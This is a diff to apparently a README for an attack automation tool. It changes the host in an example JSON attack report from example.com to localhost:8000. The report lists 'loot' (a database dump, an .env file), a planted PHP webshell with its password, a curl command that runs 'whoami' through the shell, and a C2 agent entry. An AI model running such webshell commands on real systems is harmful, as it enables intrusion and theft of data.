@@ -87,7 +87,7 @@ docker compose -f docker-compose.production.yml build frontend
 ```json
 {
   "attack_id": "atk_123",
-  "target": "example.com",
+  "target": "localhost:8000",
   "status": "exploited",
   "loot": {
     "database_dump": "/workspace/loot/database.sql",
@@ -104,9 +104,9 @@ docker compose -f docker-compose.production.yml build frontend
       "/workspace/loot/.env"
     ],
     "webshell": {
-      "url": "https://example.com/uploads/shell.php",
+      "url": "https://localhost:8000/uploads/shell.php",
       "password": "secret123",
-      "access": "curl -X POST https://example.com/uploads/shell.php -d 'cmd=whoami&pass=secret123'"
+      "access": "curl -X POST https://localhost:8000/uploads/shell.php -d 'cmd=whoami&pass=secret123'"
     },
     "c2_agent": {
       "agent_id": "agent_789",
